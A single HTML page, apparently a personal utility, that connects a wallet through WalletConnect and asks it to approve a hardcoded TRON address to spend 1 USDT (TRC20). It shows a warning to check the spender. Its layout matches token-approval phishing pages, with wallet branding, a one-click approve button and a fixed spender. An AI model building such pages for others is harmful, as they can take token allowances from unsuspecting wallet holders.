<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Trust Wallet ‚Äì TRON Approval (Personal)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <!-- Web3Modal Standalone (CORRECT) -->
  <script src="https://unpkg.com/@web3modal/standalone@2.4.3/dist/index.min.js"></script>

  <!-- TronWeb -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>

  <style>
    body {
      background: #0f172a;
      color: #fff;
      font-family: Arial, sans-serif;
      padding: 20px;
    }
    button {
      padding: 12px;
      width: 100%;
      margin: 8px 0;
      font-weight: bold;
      cursor: pointer;
    }
    .box {
      background: #020617;
      padding: 12px;
      margin-top: 12px;
      border-radius: 6px;
      word-break: break-all;
    }
    .warn {
      color: #facc15;
      font-size: 14px;
    }
  </style>
</head>

<body>

<h3>üîê Trust Wallet ‚Äì TRON Approval (Personal)</h3>

<p class="warn">
  ‚ö†Ô∏è This will request an explicit TRC20 approval.<br>
  Always verify spender & amount inside Trust Wallet.
</p>

<button onclick="connect()">1Ô∏è‚É£ Connect Trust Wallet</button>
<button onclick="approve()">2Ô∏è‚É£ Approve USDT</button>

<div class="box">
  <div>Status: <span id="status">Disconnected</span></div>
  <div>TxID: <span id="txid">-</span></div>
</div>

<script>
/* ============ CONFIG ============ */

const PROJECT_ID = "e75f4f36f23f8e6dc1f84a86fdbfa4ea";

// USDT (TRC20)
const TOKEN_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// üëà your MAIN wallet (spender)
const SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";

// 1 USDT (6 decimals)
const AMOUNT = "1000000";

/* =============================== */

let web3Modal;
let wcProvider;
let tronWeb;

/* ============ CONNECT ============ */

async function connect() {
  if (!window.Web3Modal) {
    alert("Web3Modal not loaded");
    return;
  }

  web3Modal = new window.Web3Modal({
    projectId: PROJECT_ID,
    themeMode: "dark",
    standaloneChains: ["eip155:1"] // dummy EVM chain (session only)
  });

  // Open WalletConnect modal (QR / deep link)
  wcProvider = await web3Modal.openModal();

  tronWeb = new TronWeb({
    fullHost: "https://api.trongrid.io"
  });

  document.getElementById("status").innerText =
    "WalletConnect session active";
}

/* ============ APPROVE ============ */

async function approve() {
  if (!wcProvider || !tronWeb) {
    alert("Connect Trust Wallet first");
    return;
  }

  const contractHex = tronWeb.address.toHex(TOKEN_CONTRACT);

  const { transaction } =
    await tronWeb.transactionBuilder.triggerSmartContract(
      contractHex,
      "approve(address,uint256)",
      {},
      [
        { type: "address", value: SPENDER },
        { type: "uint256", value: AMOUNT }
      ]
    );

  // üî• Trust Wallet‚Äìspecific signing
  const signedTx = await wcProvider.request({
    method: "tron_signTransaction",
    params: [transaction]
  });

  const result = await tronWeb.trx.sendRawTransaction(signedTx);

  document.getElementById("txid").innerText =
    result?.txid || "Broadcast failed";
}
</script>

</body>
</html>
